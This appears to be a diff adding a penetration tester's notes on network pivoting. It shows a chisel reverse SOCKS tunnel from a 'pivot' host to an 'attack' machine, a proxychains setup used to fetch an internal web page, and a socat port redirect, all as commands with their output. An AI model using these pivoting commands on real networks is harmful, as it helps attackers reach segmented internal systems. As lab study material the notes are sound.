@@ -1,0 +1,71 @@
+#### Reverse port forwarding
+
+## Start chisel server
+┌─[root@attack]─[~/attack]
+└──╼ #./chisel server -p 5555 --reverse 
+2021/11/13 21:52:52 server: Reverse tunnelling enabled
+2021/11/13 21:52:52 server: Fingerprint cE1SWJozVOBFwduxTukUJKCuxVeEMq9tWqMZBcySjOA=
+2021/11/13 21:52:52 server: Listening on http://0.0.0.0:5555
+
+## Start chisel client
+┌─[root@pivot]─[~/attack]
+└──╼ #./chisel client 192.168.179.128:5555 R:socks
+2021/11/13 21:53:14 client: Connecting to ws://192.168.179.128:5555
+2021/11/13 21:53:14 client: Connected (Latency 901.234µs)
+
+## Results
+┌─[root@attack]─[~/attack]
+└──╼ #./chisel server -p 5555 --reverse 
+2021/11/13 21:52:52 server: Reverse tunnelling enabled
+2021/11/13 21:52:52 server: Fingerprint cE1SWJozVOBFwduxTukUJKCuxVeEMq9tWqMZBcySjOA=
+2021/11/13 21:52:52 server: Listening on http://0.0.0.0:5555
+2021/11/13 21:53:14 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
+
+## Config
+└──╼ #tail proxychains.conf ; netstat -tnap|grep 1080
+                                            
+#
+#       proxy types: http, socks4, socks5
+#        ( auth types supported: "basic"-http  "user/pass"-socks )
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5  127.0.0.1 1080
+
+tcp        0      0 127.0.0.1:1080          0.0.0.0:*               LISTEN      82590/./chisel  
+
+## Attempting to do a http get on 192.168.234.183
+┌─[root@attack]─[~]
+└──╼ #proxychains curl -D- http://192.168.234.183 | head -n20
+ProxyChains-3.1 (http://proxychains.sf.net)
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.234.183:80-<><>-OK
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0HTTP/1.1 200 OK
+Date: Sat, 13 Nov 2021 13:56:57 GMT
+Server: Apache/2.4.47 (Win64) OpenSSL/1.1.1k PHP/7.4.19
+X-Powered-By: PHP/7.4.19
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+<!DOCTYPE html>
+<html dir="ltr" lang="en-US">
+<head>
+<meta charset="UTF-8" />
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="initial-scale=1, maximum-scale=1" />
+<meta name="viewport" content="width=device-width" />
+<title>Online Ordering</title>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+<link rel="stylesheet" href="css/reset.css" type="text/css" media="screen" />
+<link rel="stylesheet" href="css/layout.css" type="text/css" media="screen" />
+<link rel="stylesheet" href="css/jqueryslidemenu.css" type="text/css" media="screen" />
+100 14387    0 14387    0     0  1561k      0 --:--:-- --:--:-- --:--:-- 7024k
+curl: (23) Failure writing output to destination
+
+#### Extra
+## Opening up port 3000 on attacking machine. Traffic going to port 3000 will be redirect to attacking machine localport 1080.
+┌─[root@attack]─[~]
+└──╼ #socat tcp-l:3000,reuseaddr,fork tcp:127.0.0.1:1080
